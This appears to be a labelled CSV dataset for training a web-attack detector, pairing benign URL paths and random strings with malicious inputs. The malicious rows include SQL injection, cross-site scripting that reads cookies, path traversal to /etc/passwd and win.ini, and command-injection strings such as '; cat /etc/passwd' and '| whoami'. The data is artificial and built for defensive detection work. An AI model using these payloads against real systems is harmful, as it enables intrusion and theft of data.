payload,label
cbfzkPBP725l,0
/checkout?session=97691,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/dashboard?session=31017,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
ZBPsjbMorO,0
' OR 6=6 --,1
<script>var a=45;alert(a)</script>,1
/checkout?id=5514,0
' OR 2=9 --,1
dashboard,0
/search?session=18560,0
' OR 1=1 --,1
settings,0
<script>var a=322;alert(a)</script>,1
contact,0
/settings?session=44111,0
profile,0
' OR 3=4 --,1
admin%00' OR 1=1,1
' OR 6=6 --,1
<script>alert(document.cookie)</script>,1
' OR 3=8 --,1
1' o r '1'='1,1
; cat /etc/passwd,1
1glQhYieIz2FUS,0
; cat /etc/passwd,1
blog,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 1=1 --,1
jVzGl4l0zW,0
/login?id=9907,0
index,0
/cart?session=81185,0
J3Sz3DUV,0
user,0
' OR 1=1 --,1
search,0
<script>var a=901;alert(a)</script>,1
/home?id=7472,0
/register?session=84525,0
' OR 1=1 --,1
s E l E c T * f R o M a d m i n,1
admin%00' OR 1=1,1
<script>alert(document.cookie)</script>,1
' OR 5=1 --,1
profile,0
' OR 9=6 --,1
checkout,0
LVItuLxJhw4wZJ,0
/dashboard?session=92244,0
/settings?id=7728,0
/about?session=58592,0
settings,0
/about?session=68823,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 1=5 --,1
nB6VXOVSJ4IZE,0
<script>var a=194;alert(a)</script>,1
ID5ntQx6zJmeHe1,0
/about?id=3182,0
cart,0
/index?id=9894,0
/about?id=1563,0
/contact?id=5105,0
/profile?session=61010,0
onerror=alert(1),1
/dashboard?id=9808,0
jeorcvF0aj,0
rCmwHbAMuTD,0
leqK5GVn,0
home,0
<script>alert(document.cookie)</script>,1
onerror=alert(1),1
/home?session=38140,0
contact,0
admin' --,1
/dashboard?id=9431,0
javascript:alert(1),1
' OR '1'='1,1
' OR 1=1 --,1
Uk5TgaNUmKTh8,0
/settings?session=54929,0
86GxUiLaW,0
' OR 3=1 --,1
X93YT2x48iQ,0
admin%00' OR 1=1,1
/contact?session=28848,0
<script>var a=183;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=665;alert(a)</script>,1
/about?session=27747,0
/blog?session=85917,0
/checkout?session=75946,0
' OR 1=1 --,1
/register?id=2841,0
/cart?id=2012,0
/contact?session=74727,0
/profile?id=8953,0
; cat /etc/passwd,1
../../../windows/win.ini,1
' OR 5=3 --,1
<script>var a=404;alert(a)</script>,1
' OR 5=7 --,1
login,0
| whoami,1
/contact?session=98693,0
about,0
TPfh5Zrv5hEhDc7,0
contact,0
2E4dcwK5rDELJ,0
/cart?id=3818,0
onerror=alert(1),1
KNazSlvDR4qT9T,0
blog,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/user?id=7786,0
' OR 8=2 --,1
user,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/index?session=35299,0
../../../../etc/passwd,1
home,0
javascript:alert(1),1
/dashboard?id=7144,0
/blog?session=17922,0
/login?session=45868,0
/about?id=930,0
Qhp1XNjQf,0
../../../../etc/passwd,1
index,0
admin'/* bypass */OR 1=1,1
/home?id=1516,0
/dashboard?id=5141,0
index,0
/contact?session=37914,0
login,0
<script>var a=743;alert(a)</script>,1
' OR 9=2 --,1
/settings?session=21883,0
' OR '1'='1,1
../../../windows/win.ini,1
admin%00' OR 1=1,1
JvofQmM0ANkANok,0
/blog?id=8847,0
<script>alert(document.cookie)</script>,1
about,0
s E l E c T * f R o M a d m i n,1
/user?session=73167,0
' OR 2=2 --,1
/contact?session=79971,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/checkout?id=598,0
<script>var a=147;alert(a)</script>,1
/checkout?id=1506,0
07GsETUJPN0QT9,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=446;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 7=2 --,1
admin%00' OR 1=1,1
about,0
VI8qBp4D54rIVI1,0
dashboard,0
/dashboard?id=3332,0
/about?id=2964,0
/search?session=26621,0
<script>var a=322;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/home?id=8171,0
<script>var a=177;alert(a)</script>,1
/profile?id=8316,0
/search?session=70166,0
eEr0P1eBz,0
/dashboard?id=2657,0
FMqJ1NjS,0
onerror=alert(1),1
../../../windows/win.ini,1
home,0
/dashboard?id=784,0
s E l E c T * f R o M a d m i n,1
/user?session=35713,0
/register?id=6886,0
' OR 4=9 --,1
login,0
home,0
/register?id=980,0
eIjwBStRHvq2TZh,0
/settings?id=1708,0
' OR 6=5 --,1
/checkout?id=6785,0
oa3oFa44FIvGxDz,0
' OR 7=1 --,1
' OR 6=6 --,1
' OR 1=1 --,1
UutVU6RFVur1K,0
s E l E c T * f R o M a d m i n,1
YfDGH4CrvBs,0
/checkout?id=5823,0
' OR 3=7 --,1
/contact?session=54747,0
/login?session=12250,0
/search?id=3536,0
dashboard,0
/cart?id=6823,0
about,0
/cart?session=74157,0
/contact?session=35716,0
/login?session=11734,0
/blog?session=12013,0
../../../../etc/passwd,1
/index?session=63401,0
<script>var a=990;alert(a)</script>,1
<script>var a=230;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
; cat /etc/passwd,1
/home?session=99140,0
uS6Gr208wx,0
/user?session=87455,0
javascript:alert(1),1
<script>alert(document.cookie)</script>,1
index,0
' OR 2=6 --,1
/settings?session=11758,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 8=5 --,1
' OR 1=1 --,1
<script>var a=474;alert(a)</script>,1
yZBoyFAln7,0
' OR 7=3 --,1
admin'/* bypass */OR 1=1,1
/search?session=10639,0
/about?id=6622,0
admin' --,1
' OR 6=8 --,1
/settings?id=6053,0
xPaJwjPh0wVnK,0
bvs6Cuyw,0
admin'/* bypass */OR 1=1,1
<script>var a=780;alert(a)</script>,1
/profile?session=19589,0
1' o r '1'='1,1
/user?session=59603,0
about,0
' OR 6=4 --,1
/settings?session=58250,0
' OR '1'='1,1
qFSNm32Me,0
/home?session=80902,0
/register?id=8538,0
1' o r '1'='1,1
../../../windows/win.ini,1
/profile?id=4577,0
6zk8Vis2ZxyM,0
H4KsFpPO5vJ9,0
../../../windows/win.ini,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/about?session=39517,0
../../../../etc/passwd,1
1' o r '1'='1,1
/index?id=1876,0
onerror=alert(1),1
<script>var a=168;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
/search?id=249,0
<script>alert(document.cookie)</script>,1
/home?id=2352,0
/login?session=61648,0
register,0
/about?id=6447,0
<script>var a=841;alert(a)</script>,1
' OR 5=4 --,1
JkpIOjwVzt,0
<script>var a=444;alert(a)</script>,1
BgAMzc8pYAqufv,0
onerror=alert(1),1
/cart?session=37636,0
' OR 3=5 --,1
KG3VTDk3QEQap7z,0
; cat /etc/passwd,1
<script>var a=526;alert(a)</script>,1
' OR 6=1 --,1
jQxeDTSli,0
/contact?id=5605,0
/index?session=56680,0
admin'/* bypass */OR 1=1,1
/search?id=733,0
s E l E c T * f R o M a d m i n,1
<script>alert(document.cookie)</script>,1
XiRAAu3s8Y,0
blog,0
' OR 5=8 --,1
/register?session=69754,0
/search?session=82729,0
' OR 1=1 --,1
/user?id=3571,0
onerror=alert(1),1
; cat /etc/passwd,1
; cat /etc/passwd,1
<script>var a=790;alert(a)</script>,1
' OR 8=5 --,1
cart,0
admin%00' OR 1=1,1
/cart?session=19918,0
/settings?id=7038,0
checkout,0
<script>alert(document.cookie)</script>,1
' OR 5=9 --,1
' OR 2=3 --,1
<script>var a=734;alert(a)</script>,1
onerror=alert(1),1
ohufVCVs1zaJ,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
register,0
register,0
<script>var a=998;alert(a)</script>,1
../../../windows/win.ini,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../../etc/passwd,1
about,0
a8vUCGkC,0
/settings?session=98323,0
' OR 1=5 --,1
' OR 1=1 --,1
<script>var a=987;alert(a)</script>,1
' OR '1'='1,1
/dashboard?session=90412,0
admin%00' OR 1=1,1
; cat /etc/passwd,1
admin%00' OR 1=1,1
/profile?session=91128,0
onerror=alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/home?session=56627,0
/user?session=75290,0
about,0
<script>alert(document.cookie)</script>,1
/profile?id=7635,0
/blog?id=394,0
/home?id=9570,0
index,0
admin' --,1
login,0
/search?id=5564,0
<script>var a=744;alert(a)</script>,1
/checkout?id=697,0
<script>var a=386;alert(a)</script>,1
cart,0
<script>alert(document.cookie)</script>,1
/register?id=649,0
' OR '1'='1,1
/profile?session=80736,0
f47jH5rUUtnDk,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
1' o r '1'='1,1
Ac8IAgb471Z,0
/register?session=16485,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR '1'='1,1
settings,0
../../../../etc/passwd,1
onerror=alert(1),1
/index?session=60246,0
../../../windows/win.ini,1
' OR 3=9 --,1
rpqEzjQAjRpNk2,0
bpXiO5jygPHrSQ,0
admin'/* bypass */OR 1=1,1
profile,0
dK3Pq7rNLCfkcv,0
search,0
checkout,0
/index?session=54815,0
../../../../etc/passwd,1
/search?session=33177,0
../../../windows/win.ini,1
/settings?session=89381,0
' OR 4=5 --,1
<script>var a=207;alert(a)</script>,1
/checkout?id=4767,0
home,0
profile,0
/about?session=33227,0
cart,0
javascript:alert(1),1
index,0
/blog?session=15116,0
admin%00' OR 1=1,1
../../../windows/win.ini,1
s E l E c T * f R o M a d m i n,1
search,0
s E l E c T * f R o M a d m i n,1
<script>var a=221;alert(a)</script>,1
admin%00' OR 1=1,1
FUrPkuvBr,0
profile,0
' OR 1=9 --,1
/cart?session=85359,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>alert(document.cookie)</script>,1
' OR 7=7 --,1
checkout,0
../../../windows/win.ini,1
/about?id=7547,0
home,0
' OR 1=1 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
; cat /etc/passwd,1
../../../windows/win.ini,1
javascript:alert(1),1
/cart?id=6113,0
| whoami,1
<script>var a=583;alert(a)</script>,1
<script>var a=352;alert(a)</script>,1
' OR 1=1 --,1
/checkout?session=67083,0
dashboard,0
checkout,0
onerror=alert(1),1
register,0
/about?session=92493,0
' OR 2=9 --,1
1' o r '1'='1,1
index,0
index,0
/dashboard?id=8468,0
index,0
<script>var a=831;alert(a)</script>,1
' OR 9=5 --,1
<script>var a=758;alert(a)</script>,1
<script>var a=655;alert(a)</script>,1
1' o r '1'='1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
wXcFiuuDPB8mJu,0
/search?id=6466,0
NOi2ryAXr77H,0
<script>var a=916;alert(a)</script>,1
' OR 3=2 --,1
' OR 5=4 --,1
dashboard,0
/register?id=5709,0
/dashboard?id=6781,0
/contact?session=18135,0
checkout,0
user,0
admin' --,1
dashboard,0
rsq0tfz0,0
index,0
profile,0
' OR 1=1 --,1
/dashboard?session=91473,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=935;alert(a)</script>,1
home,0
<script>var a=219;alert(a)</script>,1
/cart?id=1191,0
7yzpjXWtq0,0
/checkout?id=6794,0
/user?id=6912,0
' OR '1'='1,1
<script>var a=518;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/search?session=79446,0
' OR 8=8 --,1
home,0
' OR 5=4 --,1
/user?session=99059,0
' OR '1'='1,1
<script>var a=729;alert(a)</script>,1
CWYHT3bEsmrVazK,0
05mQrgyPqPBEy,0
| whoami,1
/search?session=35688,0
1AnxFtRpb,0
<script>alert(document.cookie)</script>,1
/home?id=8432,0
/blog?session=23040,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 4=9 --,1
ud8cmzGGesU6xwT,0
<script>alert(document.cookie)</script>,1
about,0
GHXGJTp1cFs,0
admin' --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
bsOgzjiA1ekrY,0
; cat /etc/passwd,1
' OR 1=5 --,1
register,0
3SDLkLy2DA,0
CtNxzQy5GtJ2M6m,0
' OR 3=9 --,1
onerror=alert(1),1
ZNEGdxneBZ,0
' OR '1'='1,1
home,0
/user?id=7651,0
' OR 8=2 --,1
LzZHoJIuuFm,0
' OR 1=1 --,1
<script>var a=946;alert(a)</script>,1
/user?session=32746,0
/register?session=28178,0
MFNMHTwISQWSP,0
' OR 2=1 --,1
s E l E c T * f R o M a d m i n,1
/contact?id=2962,0
index,0
/checkout?session=90594,0
../../../windows/win.ini,1
profile,0
/blog?id=1826,0
<script>var a=821;alert(a)</script>,1
d16lY7Zz1,0
admin'/* bypass */OR 1=1,1
../../../windows/win.ini,1
ZHTd1AuPms,0
register,0
/contact?id=9022,0
<script>var a=521;alert(a)</script>,1
<script>var a=20;alert(a)</script>,1
about,0
<script>var a=707;alert(a)</script>,1
/profile?id=525,0
admin'/* bypass */OR 1=1,1
/search?session=26781,0
' OR 8=7 --,1
/user?id=6842,0
s E l E c T * f R o M a d m i n,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
../../../../etc/passwd,1
../../../windows/win.ini,1
/dashboard?id=209,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=525;alert(a)</script>,1
../../../windows/win.ini,1
/dashboard?session=12440,0
QriRxWDJH,0
' OR 4=7 --,1
<script>var a=954;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
blog,0
admin%00' OR 1=1,1
/settings?id=6973,0
' OR 7=7 --,1
1' o r '1'='1,1
Ue84V9BiNeae3,0
; cat /etc/passwd,1
/checkout?id=7166,0
register,0
dashboard,0
<script>alert(document.cookie)</script>,1
gvhZyrVuG9W0,0
' OR '1'='1,1
<script>var a=417;alert(a)</script>,1
contact,0
onerror=alert(1),1
' OR 4=6 --,1
<script>var a=508;alert(a)</script>,1
' OR '1'='1,1
/checkout?session=69575,0
index,0
1' o r '1'='1,1
/home?session=94801,0
' OR 1=1 --,1
' OR 5=5 --,1
cart,0
oNwmtOzjx,0
checkout,0
/settings?session=70826,0
; cat /etc/passwd,1
index,0
' OR 1=1 --,1
/dashboard?session=42496,0
CrskPZ2Ec5Zxmfx,0
dashboard,0
<script>alert(document.cookie)</script>,1
/checkout?session=78693,0
admin' --,1
/user?id=50,0
about,0
index,0
yx9DHs18gBeHcjD,0
; cat /etc/passwd,1
cart,0
javascript:alert(1),1
settings,0
9Mi2GO5M,0
onerror=alert(1),1
/home?id=9264,0
../../../windows/win.ini,1
home,0
' OR 2=3 --,1
/search?id=9332,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
VtAlgNvKot,0
<script>alert(document.cookie)</script>,1
' OR 3=7 --,1
' OR 3=7 --,1
' OR 3=2 --,1
F9AkFOhD,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
cT95KfaUwJr,0
' OR 7=2 --,1
index,0
/contact?id=1774,0
' OR 7=6 --,1
onerror=alert(1),1
5MiddsjC,0
/register?id=9042,0
onerror=alert(1),1
admin' --,1
/settings?session=29963,0
profile,0
register,0
index,0
' OR '1'='1,1
1' o r '1'='1,1
; cat /etc/passwd,1
admin' --,1
/checkout?id=555,0
admin' --,1
/register?id=8299,0
/checkout?id=9204,0
/dashboard?session=44620,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=164;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/register?session=73119,0
/home?id=291,0
| whoami,1
settings,0
hBWn7Hvs,0
' OR 1=1 --,1
admin'/* bypass */OR 1=1,1
<script>var a=207;alert(a)</script>,1
<script>var a=136;alert(a)</script>,1
uoqvNQjIu6VQVV,0
admin' --,1
<script>var a=646;alert(a)</script>,1
home,0
<script>var a=539;alert(a)</script>,1
/dashboard?session=93844,0
onerror=alert(1),1
user,0
/home?id=135,0
<script>var a=294;alert(a)</script>,1
tOnsWxRNQy,0
admin'/* bypass */OR 1=1,1
/settings?id=4834,0
contact,0
/profile?session=95464,0
' OR 6=9 --,1
; cat /etc/passwd,1
/profile?session=92211,0
<script>var a=512;alert(a)</script>,1
admin%00' OR 1=1,1
/login?id=8132,0
blog,0
s E l E c T * f R o M a d m i n,1
/dashboard?session=47117,0
s E l E c T * f R o M a d m i n,1
1' o r '1'='1,1
javascript:alert(1),1
7rbgDbp9I,0
../../../../etc/passwd,1
gZSB7TuE2,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
../../../../etc/passwd,1
admin'/* bypass */OR 1=1,1
/blog?id=2248,0
contact,0
/about?id=8766,0
' OR 1=1 --,1
/index?id=3384,0
/dashboard?session=70451,0
| whoami,1
9VtKINBe3w,0
/search?session=68155,0
/checkout?id=3082,0
MBtsLkf6MqvIo,0
admin' --,1
; cat /etc/passwd,1
yFNkeuzyRuD,0
javascript:alert(1),1
/user?session=33306,0
<script>var a=404;alert(a)</script>,1
dashboard,0
<script>var a=959;alert(a)</script>,1
' OR 1=1 --,1
<script>var a=779;alert(a)</script>,1
<script>var a=87;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
javascript:alert(1),1
<script>alert(document.cookie)</script>,1
' OR 1=5 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/login?session=37884,0
/user?id=2996,0
admin' --,1
Cu8p1A417,0
../../../windows/win.ini,1
../../../windows/win.ini,1
register,0
1' o r '1'='1,1
VbNpdPxHF0,0
' OR 4=1 --,1
KfKPQLd5Qs,0
login,0
home,0
<script>var a=488;alert(a)</script>,1
onerror=alert(1),1
/home?id=6473,0
' OR 1=1 --,1
/register?id=1701,0
' OR 9=8 --,1
' OR 5=2 --,1
cart,0
admin' --,1
/blog?session=62481,0
1' o r '1'='1,1
admin' --,1
profile,0
s E l E c T * f R o M a d m i n,1
/about?id=8671,0
<script>var a=838;alert(a)</script>,1
/login?id=6000,0
1' o r '1'='1,1
admin%00' OR 1=1,1
<script>var a=609;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
eSjt5O6x6craTT,0
<script>var a=625;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
JCDioo2dy45GN,0
/checkout?id=8073,0
/about?session=74503,0
/profile?id=6290,0
<script>var a=778;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
/profile?id=3460,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=918;alert(a)</script>,1
<script>var a=47;alert(a)</script>,1
r34JmansizinjVm,0
admin%00' OR 1=1,1
/profile?id=608,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
s E l E c T * f R o M a d m i n,1
/about?session=14501,0
admin' --,1
../../../windows/win.ini,1
; cat /etc/passwd,1
/about?session=35023,0
<script>var a=261;alert(a)</script>,1
/home?id=7636,0
javascript:alert(1),1
/dashboard?session=29676,0
/settings?session=42980,0
<script>var a=698;alert(a)</script>,1
/profile?id=6811,0
SMYCsXmv6pY,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>alert(document.cookie)</script>,1
<script>var a=306;alert(a)</script>,1
/login?session=48222,0
| whoami,1
search,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
Xg2TCXBZWq6c7l,0
IIHzfaJGljm3,0
<script>var a=101;alert(a)</script>,1
1' o r '1'='1,1
<script>var a=565;alert(a)</script>,1
/profile?id=6811,0
index,0
' OR 5=3 --,1
<script>var a=637;alert(a)</script>,1
<script>var a=80;alert(a)</script>,1
<script>var a=494;alert(a)</script>,1
/login?id=7530,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=339;alert(a)</script>,1
/cart?id=9629,0
contact,0
<script>var a=953;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
1' o r '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>alert(document.cookie)</script>,1
<script>alert(document.cookie)</script>,1
/index?session=57214,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
eQDm1FZqC0ih,0
/contact?id=4830,0
/contact?session=91678,0
admin'/* bypass */OR 1=1,1
/contact?session=69784,0
/home?session=22493,0
profile,0
<script>var a=687;alert(a)</script>,1
/index?session=52163,0
contact,0
' OR '1'='1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
contact,0
/about?id=443,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin'/* bypass */OR 1=1,1
../../../windows/win.ini,1
<script>var a=817;alert(a)</script>,1
| whoami,1
/search?id=7323,0
<script>var a=323;alert(a)</script>,1
' OR 3=8 --,1
<script>var a=899;alert(a)</script>,1
/login?session=51705,0
' OR 7=8 --,1
<script>alert(document.cookie)</script>,1
profile,0
<script>var a=175;alert(a)</script>,1
<script>var a=436;alert(a)</script>,1
onerror=alert(1),1
' OR '1'='1,1
/about?session=38230,0
<script>var a=352;alert(a)</script>,1
1' o r '1'='1,1
1' o r '1'='1,1
javascript:alert(1),1
admin%00' OR 1=1,1
' OR '1'='1,1
about,0
glA8DeauRif,0
X8Nvsbkoi2kBP,0
s E l E c T * f R o M a d m i n,1
<script>var a=364;alert(a)</script>,1
' OR 2=7 --,1
/dashboard?id=6117,0
<script>var a=633;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
checkout,0
<script>var a=437;alert(a)</script>,1
cart,0
Trxlh0P9yS,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
checkout,0
/register?id=8282,0
<script>var a=98;alert(a)</script>,1
/settings?id=3132,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/home?id=2550,0
admin' --,1
/index?session=15156,0
<script>var a=578;alert(a)</script>,1
beqjNc8qTwSud,0
<script>var a=71;alert(a)</script>,1
33uuo8q0,0
' OR 1=8 --,1
/dashboard?id=6829,0
/home?id=974,0
DyumOHpmZPJz5ub,0
/index?id=3038,0
/search?session=97975,0
../../../windows/win.ini,1
/login?id=1819,0
/contact?id=6916,0
vcsf8jFmjDhnyo,0
settings,0
LCDVH4xr,0
../../../windows/win.ini,1
onerror=alert(1),1
ep36JRLfAg,0
/dashboard?session=78218,0
' OR 3=2 --,1
ZTxyin5pEJa,0
about,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
profile,0
home,0
../../../windows/win.ini,1
/checkout?session=83087,0
Man6UrYo29a6We5,0
/profile?id=2395,0
/checkout?session=20502,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
yoqi9dhQCm,0
1' o r '1'='1,1
/register?session=51317,0
/search?id=8387,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
settings,0
admin' --,1
uacGUn1CGK,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
checkout,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/blog?id=5741,0
<script>var a=639;alert(a)</script>,1
qpLiUEOHLTTldiy,0
/search?session=39302,0
/register?id=2819,0
javascript:alert(1),1
settings,0
about,0
profile,0
OtHPSWmq8X,0
onerror=alert(1),1
../../../../etc/passwd,1
/register?session=67871,0
/search?id=1308,0
' OR '1'='1,1
register,0
' OR '1'='1,1
profile,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/user?id=4028,0
../../../../etc/passwd,1
sPC1NbkJUM,0
/about?session=38723,0
z0D8OnuwRk4nZp,0
checkout,0
/contact?session=14576,0
